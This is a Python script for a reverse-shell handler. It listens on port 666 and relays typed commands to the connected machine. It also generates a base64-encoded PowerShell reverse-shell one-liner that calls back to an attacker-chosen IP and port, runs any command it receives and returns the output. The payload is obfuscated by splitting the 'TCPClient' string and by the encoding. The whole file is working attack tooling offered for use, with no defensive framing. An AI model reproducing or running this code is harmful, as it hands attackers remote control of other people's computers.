import base64
import socket


default_port = 666  # desired port to listen on
connect = ''

while True:
    cmd_ready = True
    cmd = input("> ")

    if cmd == '.listen':
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('', default_port))
        sock.listen()
        connect, addr = sock.accept()
        print("[+] Connection received!")
        cmd_ready = False

    if cmd == '':
        cmd_ready = False

    if cmd == '.payload':
        ip = input("IP Address to connect back to (server): ")
        port = input("Port to connect back to: ")
        script = f"$client = New-Object System.Net.Sockets.TC''PClient('{ip}','{port}');$stream = " \
                    f"$client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, " \
                    f"$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(" \
                    f"$bytes,0, $i);$sendback = (iex \". {{ $data }} 2>&1\" | Out-String ); $sendback2 = $sendback + " \
                    f"'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes(" \
                    f"$sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        b64_shellcode = base64.b64encode(script.encode('utf-16')[2:]).decode()
        print(f"powershell -e {b64_shellcode}")
        print("[+] Encoded powershell script generated")
        cmd_ready = False

    if cmd_ready and connect != '':
        connect.send(cmd.encode())
        data = connect.recv(1024)
        print(data.decode())
